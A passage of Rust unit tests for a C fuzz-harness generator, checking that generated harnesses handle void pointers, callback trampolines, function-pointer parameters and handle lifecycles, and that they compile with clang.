            "clang failed\nstdout:\n{}\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn generate_c_direct_harness_drives_standalone_void_pointer() {
        let work = temp_dir("emit-void-pointer");
        let header = work.join("target.h");
        let header_source = r#"
            int parse_opaque(void *opaque);
        "#;
        fs::write(&header, header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CVOID".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("parse_opaque"),
            params: vec![CParameter {
                name: "opaque".to_owned(),
                c_type: "void *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("void * opaque = calloc(Size ? Size : 1, 1)"));
        assert!(main.contains("if (opaque && Size) memcpy(opaque, Data, Size)"));
        assert!(main.contains("int R = parse_opaque(opaque);"));
        assert!(main.contains("free(opaque);"));

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping generated C void* harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("void_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstdout:\n{}\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn strip_redundant_callback_typedef_drops_leading_typedef_keeps_trampoline() {
        let param = CParamEmission {
            support: Some(
                "typedef int (*cb_t)(void *, int);\n\
                 static int _gf_cb_trampoline(void *u, int n) { (void)u; (void)n; return 0; }"
                    .to_owned(),
            ),
            decl: "cb_t cb = (cb_t)_gf_cb_trampoline".to_owned(),
            arg: "cb".to_owned(),
            c_type: "cb_t".to_owned(),
            free: None,
        };
        let support = strip_redundant_callback_typedef(param).support.unwrap();
        // The header already declares cb_t — our redefining typedef is dropped, but
        // the trampoline definition (referenced by the cast decl) is kept.
        assert!(!support.contains("typedef"), "typedef dropped: {support}");
        assert!(
            support.contains("static int _gf_cb_trampoline(void *u, int n)"),
            "trampoline kept: {support}"
        );

        // A non-callback support (no leading `typedef `) is returned unchanged.
        let other = CParamEmission {
            support: Some("static char buf[8];".to_owned()),
            decl: "char *p = buf".to_owned(),
            arg: "p".to_owned(),
            c_type: "char *".to_owned(),
            free: None,
        };
        assert_eq!(
            strip_redundant_callback_typedef(other).support.as_deref(),
            Some("static char buf[8];")
        );
    }

    #[test]
    fn strip_redundant_callback_typedef_keeps_synthesized_inline_typedef() {
        // An INLINE (anonymous) function-pointer param — `void (*cb)(const char*,
        // int, void*)` — has no project typedef behind it; the only declaration of
        // the decl type `_gf_cb_<name>` is the synthesized `typedef …;` line. The
        // included header CANNOT supply it, so stripping the typedef would leave the
        // decl referencing an undeclared `_gf_cb_*` type (md4c md_html). It must be
        // KEPT even when the target's header is included.
        let param = CParamEmission {
            support: Some(
                "typedef void (*_gf_cb_process_output)(const char*, int, void*);\n\
                 static void _gf_process_output_trampoline(const char* a, int b, void* c) \
                 { (void)a; (void)b; (void)c; }"
                    .to_owned(),
            ),
            decl: "_gf_cb_process_output process_output = \
                   (_gf_cb_process_output)_gf_process_output_trampoline"
                .to_owned(),
            arg: "process_output".to_owned(),
            c_type: "_gf_cb_process_output".to_owned(),
            free: None,
        };
        let support = strip_redundant_callback_typedef(param).support.unwrap();
        assert!(
            support.contains("typedef void (*_gf_cb_process_output)"),
            "synthesized inline typedef must be kept: {support}"
        );
        assert!(
            support.contains("static void _gf_process_output_trampoline("),
            "trampoline definition kept: {support}"
        );
    }

    #[test]
    fn generate_c_direct_harness_emits_callback_trampoline() {
        let work = temp_dir("emit-callback");
        let header = work.join("target.h");
        let header_source = r#"
            typedef int (*visit_cb)(void *opaque, const char *name);
            int walk(visit_cb cb, void *opaque);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CCB".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("walk"),
            params: vec![
                CParameter {
                    name: "cb".to_owned(),
                    c_type: "visit_cb".to_owned(),
                },
                CParameter {
                    name: "opaque".to_owned(),
                    c_type: "void *".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("static int _gf_cb_trampoline(void *opaque, const char *name)"));
        assert!(main.contains("visit_cb cb = (visit_cb)_gf_cb_trampoline;"));
        assert!(main.contains("int R = walk(cb, opaque);"));
        assert!(main.contains("free(opaque);"));

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping generated C callback harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("callback_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstdout:\n{}\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn generate_c_direct_harness_emits_inline_callback_typedef_when_header_included() {
        // md4c's `md_html` takes an INLINE (anonymous) function-pointer param:
        // `void (*process_output)(const char*, unsigned, void*)`. There is no
        // project typedef for it, so the harness must emit BOTH the synthesized
        // `_gf_cb_process_output` typedef AND the trampoline definition — even
        // though the target's header is included (`target_declared_in_header:
        // true`). Previously the typedef was stripped as "redundant", leaving
        // `_gf_cb_process_output` undeclared (failed_build).
        let work = temp_dir("emit-inline-callback");
        let header = work.join("target.h");
        let header_source = r#"
            int md_html(const char* input, unsigned input_size,
                        void (*process_output)(const char*, unsigned, void*),
                        void* userdata);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CICB".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("md_html"),
            params: vec![
                CParameter {
                    name: "input".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "input_size".to_owned(),
                    c_type: "unsigned".to_owned(),
                },
                CParameter {
                    name: "process_output".to_owned(),
                    c_type: "void (*)(const char *, unsigned, void *)".to_owned(),
                },
                CParameter {
                    name: "userdata".to_owned(),
                    c_type: "void *".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("typedef void (*_gf_cb_process_output)"),
            "synthesized inline callback typedef must be emitted:\n{main}"
        );
        assert!(
            main.contains("_gf_cb_process_output process_output = (_gf_cb_process_output)"),
            "callback decl references the synthesized typedef:\n{main}"
        );

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping inline callback harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("inline_callback_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    /// Shared driver for the callback struct-field / variadic compile fixtures:
    /// generate a direct C harness for `target` over `header_source`, assert the
    /// expected substrings appear in the emitted main.c, then (when clang is on
    /// PATH) compile it to prove the emitted source builds.
    fn assert_callback_harness_compiles(
        case: &str,
        header_source: &str,
        target: &str,
        params: Vec<CParameter>,
        expect_substrings: &[&str],
    ) {
        let work = temp_dir(case);
        let header = work.join("target.h");
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: format!("H-{case}"),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction(target),
            params,
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        for needle in expect_substrings {
            assert!(
                main.contains(needle),
                "expected {needle:?} in emitted harness:\n{main}"
            );
        }

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping {case} callback harness compile: clang not on PATH");
            return;
        }
        let obj = work.join(format!("{case}.o"));
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed for {case}\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn generate_c_direct_harness_fills_callback_array_struct_field() {
        // §27.3: a struct with a callback ARRAY field — `void (*handlers[N])(int)`,
        // a dispatch table — must have every slot populated with a no-op trampoline
        // (not left NULL / assigned to a non-assignable array lvalue) so the
        // synthesised struct is safe to pass and its handlers are callable.
        assert_callback_harness_compiles(
            "CBARR",
            "struct dispatch { void (*handlers[4])(int); int n; };\n\
             int run_dispatch(const struct dispatch *d);\n",
            "run_dispatch",
            vec![CParameter {
                name: "d".to_owned(),
                c_type: "const struct dispatch *".to_owned(),
            }],
            // The array is filled with a cast trampoline in a bounded loop.
            &[".handlers[", "(void (*)(int))", "_handlers_trampoline"],
        );
    }

    #[test]
    fn generate_c_direct_harness_fills_inline_callback_struct_field() {
        // §27.9: a struct with an INLINE (non-typedef) function-pointer field —
        // `int (*cmp)(const void *, const void *)`, a comparator slot — must be
        // assigned a matching no-op trampoline instead of being dropped/zeroed.
        assert_callback_harness_compiles(
            "CBINLINE",
            "struct ops { int (*cmp)(const void *, const void *); int x; };\n\
             int run_ops(const struct ops *o);\n",
            "run_ops",
            vec![CParameter {
                name: "o".to_owned(),
                c_type: "const struct ops *".to_owned(),
            }],
            &[".cmp = ", "_cmp_trampoline"],
        );
    }

    #[test]
    fn generate_c_direct_harness_drives_variadic_callback_param() {
        // §27.3: a VARIADIC callback typedef param — `typedef void (*log_fn)(int,
        // ...)`, a logging sink — gets a trampoline whose prototype keeps the `...`
        // verbatim (a no-op stub that ignores the varargs), so the target builds and
        // is callable rather than being skipped as unsatisfiable.
        assert_callback_harness_compiles(
            "CBVARIADIC",
            "typedef void (*log_fn)(int level, ...);\n\
             int run_logger(log_fn fn, const unsigned char *data, unsigned len);\n",
            "run_logger",
            vec![
                CParameter {
                    name: "fn".to_owned(),
                    c_type: "log_fn".to_owned(),
                },
                CParameter {
                    name: "data".to_owned(),
                    c_type: "const unsigned char *".to_owned(),
                },
                CParameter {
                    name: "len".to_owned(),
                    c_type: "unsigned".to_owned(),
                },
            ],
            &[
                "_gf_fn_trampoline(int level, ...)",
                "(log_fn)_gf_fn_trampoline",
            ],
        );
    }

    #[test]
    fn generate_c_direct_harness_emits_trampoline_for_pointer_returning_funcptr_param() {
        // json.h's `json_parse_ex` takes a POINTER-RETURNING inline funcptr param:
        // `void *(*alloc_func_ptr)(void *, size_t)`. Previously the param decoder
        // spliced a `= calloc(...)` buffer initializer into the MIDDLE of the
        // funcptr declarator (`void * (*alloc_func_ptr)(void = calloc(...)`) — a
        // syntax error that failed the build. It must instead synthesize a typedef
        // + a no-op trampoline returning NULL and pass that as a single argument.
        let work = temp_dir("emit-ptr-ret-funcptr");
        let header = work.join("target.h");
        let header_source = r#"
            void *json_parse_ex(const void *src, unsigned src_size,
                                void *(*alloc_func_ptr)(void *, unsigned),
                                void *user_data);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CJPE".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("json_parse_ex"),
            params: vec![
                CParameter {
                    name: "src".to_owned(),
                    c_type: "const void *".to_owned(),
                },
                CParameter {
                    name: "src_size".to_owned(),
                    c_type: "unsigned".to_owned(),
                },
                // Canonical model the c_parser now produces for the funcptr.
                CParameter {
                    name: "alloc_func_ptr".to_owned(),
                    c_type: "void * (*)(void *, unsigned)".to_owned(),
                },
                CParameter {
                    name: "user_data".to_owned(),
                    c_type: "void *".to_owned(),
                },
            ],
            return_type: "void *".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        // A pointer-returning trampoline + the synthesized typedef.
        assert!(
            main.contains("typedef void * (*_gf_cb_alloc_func_ptr)(void *, unsigned)"),
            "synthesized funcptr typedef must be emitted:\n{main}"
        );
        assert!(
            main.contains("static void * _gf_alloc_func_ptr_trampoline("),
            "no-op trampoline returning a pointer must be emitted:\n{main}"
        );
        assert!(
            main.contains(
                "_gf_cb_alloc_func_ptr alloc_func_ptr = (_gf_cb_alloc_func_ptr)\
                 _gf_alloc_func_ptr_trampoline"
            ),
            "funcptr param decl assigns the trampoline:\n{main}"
        );
        // The broken splice must be gone: no calloc into the declarator, no leaked
        // `(*alloc_func_ptr)(` declarator at the call site / decl.
        assert!(
            !main.contains("(*alloc_func_ptr)("),
            "the funcptr declarator must not leak into the harness body:\n{main}"
        );

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping ptr-returning funcptr harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("ptr_ret_funcptr_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn recover_leaked_funcptr_param_rebuilds_canonical_model() {
        // Defensive net: a parse that leaks the declarator into the name
        // (`(*cb)(args)`, c_type collapsed to the bare return type) is rebuilt into
        // the canonical funcptr model so it routes through the trampoline path.
        let (name, ty) = crate::c_decoders::recover_leaked_funcptr_param(
            "(*alloc_func_ptr)(void *user_data, size_t size)",
            "void *",
        )
        .expect("leaked funcptr name is recovered");
        assert_eq!(name, "alloc_func_ptr");
        assert_eq!(ty, "void * (*)(void *user_data, size_t size)");

        // An ordinary identifier name is left alone (no false positives).
        assert!(crate::c_decoders::recover_leaked_funcptr_param("user_data", "void *").is_none());
        assert!(crate::c_decoders::recover_leaked_funcptr_param("n", "int").is_none());
    }

    #[test]
    fn generate_c_direct_harness_rejects_unsupported_param_type() {
        let out = temp_dir("emit-unsupported");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C003".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/y.c"),
            target: cfunction("f"),
            params: vec![CParameter {
                name: "p".to_owned(),
                c_type: "struct foo *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let err = generate_c_direct_harness(args).unwrap_err();
        assert!(matches!(err, HarnessGenError::UnsupportedParamType(_)));
    }

    #[test]
    fn generate_c_direct_harness_force_drives_rejected_param_best_effort() {
        // Same opaque `struct foo *` that `..._rejects_unsupported_param_type`
        // proves is skipped WITHOUT force. Under `force: true` the parameter gets
        // a best-effort compiling driver, so the target is harnessed instead of
        // erroring out `unsupported_params`.
        let out = temp_dir("emit-force-opaque");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: true,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C003F".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/y.c"),
            target: cfunction("f"),
            params: vec![CParameter {
                name: "p".to_owned(),
                c_type: "struct foo *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args)
            .expect("force mode must synthesize a best-effort driver, not reject");
        let main = std::fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("(struct foo *)"),
            "the opaque pointer must be cast from a best-effort buffer:\n{main}"
        );
    }

    #[test]
    fn generate_c_direct_harness_skips_incomplete_opaque_handle_with_inplace_lifecycle() {
        // GAP #6 (tidwall/hashmap.c): an opaque `struct foo *` whose body is NOT
        // visible to the harness (no `struct foo {...}` in any included header /
        // type def — its definition lives only in a non-included `.c`) cannot be
        // stack-allocated for an in-place / destructor-only lifecycle: the
        // declaration would be an illegal "variable has incomplete type". Since the
        // constructor is in-place (not a returning constructor), there is nothing to
        // synthesize, so the target is cleanly SKIPPED (UnsupportedParamType) instead
        // of emitting un-compilable code that fails the build.
        let out = temp_dir("emit-lifecycle-incomplete");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: vec![CHandleLifecycle {
                handle_type: "struct foo".to_owned(),
                init: Some("foo_initialize".to_owned()),
                delete: Some("foo_delete".to_owned()),
                init_returns_handle: false,
                init_args: vec![],
            }],
            drive_plan: None,
            harness_id: "H-C00L".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/foo.c"),
            target: cfunction("foo_run"),
            params: vec![
                CParameter {
                    name: "f".to_owned(),
                    c_type: "struct foo *".to_owned(),
                },
                CParameter {
                    name: "n".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let err = generate_c_direct_harness(args).unwrap_err();
        match err {
            HarnessGenError::UnsupportedParamType(reason) => {
                assert!(
                    reason.contains("incomplete in the harness"),
                    "skip reason should name the incomplete-type cause: {reason}"
                );
            }
            other => panic!("expected UnsupportedParamType skip, got {other:?}"),
        }
    }

    #[test]
    fn generate_c_direct_harness_builds_lifecycle_handle_complete_in_header() {
        // Regression guard for GAP #6: a handle whose struct IS fully defined in a
        // header the harness includes must NOT be over-skipped — the completeness
        // oracle lists it, so the harness is generated and COMPILES. (A complete
        // struct resolves to a concrete shape and is driven through field synthesis;
        // the point of this guard is that a header-complete lifecycle target still
        // produces a buildable harness rather than a spurious skip.)
        let work = temp_dir("emit-lifecycle-complete");
        let header = work.join("box.h");
        let header_source = r#"
            #include <stddef.h>
            struct box { int a; int b; };
            void box_init(struct box *b);
            void box_destroy(struct box *b);
            int box_run(struct box *b, int n);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: vec![CHandleLifecycle {
                handle_type: "struct box".to_owned(),
                init: Some("box_init".to_owned()),
                delete: Some("box_destroy".to_owned()),
                init_returns_handle: false,
                init_args: vec![],
            }],
            drive_plan: None,
            harness_id: "H-C0BX".to_owned(),
            output_dir: work.join("harness"),
            source_path: header.clone(),
            target: cfunction("box_run"),
            params: vec![
                CParameter {
                    name: "b".to_owned(),
                    c_type: "struct box *".to_owned(),
                },
                CParameter {
                    name: "n".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["box.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).expect("header-complete handle is buildable");
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("int R = box_run(b, n);"), "{main}");

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping header-complete lifecycle harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("box_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn generate_c_direct_harness_constructs_handle_via_returning_constructor() {
        // `gizmo_t *gizmo_new(void)` returns the opaque handle; the harness must
        // build it from the return value, pass it by value, and free it
        // directly — then compile cleanly against the header.
        let work = temp_dir("emit-lifecycle-returning");
        let header = work.join("gizmo.h");
        fs::write(
            &header,
            r#"
                #include <stddef.h>
                typedef struct gizmo gizmo_t;
                gizmo_t *gizmo_new(void);
                void gizmo_free(gizmo_t *g);
                int gizmo_process(gizmo_t *g, int n);
            "#,
        )
        .unwrap();
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: vec![CHandleLifecycle {
                handle_type: "gizmo_t".to_owned(),
                init: Some("gizmo_new".to_owned()),
                delete: Some("gizmo_free".to_owned()),
                init_returns_handle: true,
                init_args: vec![],
            }],
            drive_plan: None,
            harness_id: "H-C0RC".to_owned(),
            output_dir: work.join("harness"),
            source_path: header.clone(),
            target: cfunction("gizmo_process"),
            params: vec![
                CParameter {
                    name: "g".to_owned(),
                    c_type: "gizmo_t *".to_owned(),
                },
                CParameter {
                    name: "n".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["gizmo.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("g = gizmo_new()"), "{main}");
        assert!(main.contains("int R = gizmo_process(g, n);"), "{main}");
        assert!(main.contains("gizmo_free(g)"), "{main}");
        assert!(!main.contains("_gf_lc_g"), "no stack storage: {main}");
        // The handle must be passed by value (`gizmo_process(g, n)`), never by
        // address. Match `&g` only as a COMPLETE identifier reference (the next
        // char is not an identifier char) so it doesn't false-match the coverage
        // runtime's own `&govfuzz_*` symbols (e.g. `&govfuzz_cmpp_open`).
        let passes_handle_by_ref = main.match_indices("&g").any(|(i, _)| {
            main[i + 2..]
                .chars()
                .next()
                .is_none_or(|c| !c.is_alphanumeric() && c != '_')
        });
        assert!(!passes_handle_by_ref, "handle passed by value: {main}");

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping returning-constructor harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn void_return_via_export_macro_is_not_captured() {
        assert!(c_return_is_void("void"));
        assert!(c_return_is_void("  void "));
        assert!(c_return_is_void("YAML_DECLARE(void)"));
        assert!(c_return_is_void("MZ_API( void )"));
        assert!(!c_return_is_void("int"));
        assert!(!c_return_is_void("YAML_DECLARE(int)"));
        assert!(!c_return_is_void("void *"));
    }

    #[test]
    fn generate_c_direct_harness_compiles_struct_enum_array_decoder() {
        let work = temp_dir("emit-struct-compile");
        let header = work.join("target.h");
        let header_source = r#"
            #include <stddef.h>
            enum mode { MODE_A, MODE_B };
            struct config {
                int count;
                const char *name;
                enum mode mode;
                char tag[4];
            };
            int run(struct config cfg, struct config *out);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CSTRUCT".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("run"),
            params: vec![
                CParameter {
                    name: "cfg".to_owned(),
                    c_type: "struct config".to_owned(),
                },
                CParameter {
                    name: "out".to_owned(),
                    c_type: "struct config *".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("struct config cfg"));
        assert!(main.contains("cfg.count = gf_i32(&Cur)"));
        assert!(main.contains("cfg.name = gf_c_string(&Cur, 256)"));
        assert!(main.contains("cfg.mode = (enum mode)MODE_A"));
        assert!(main.contains("cfg.tag[_gf_i_cfg_tag] = (char)gf_u8(&Cur)"));
        assert!(main.contains("struct config _gf_value_out"));
        assert!(main.contains("struct config * out = &_gf_value_out"));
        assert!(main.contains("free((void *)cfg.name)"));
        assert!(main.contains("free((void *)_gf_value_out.name)"));

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping generated C harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
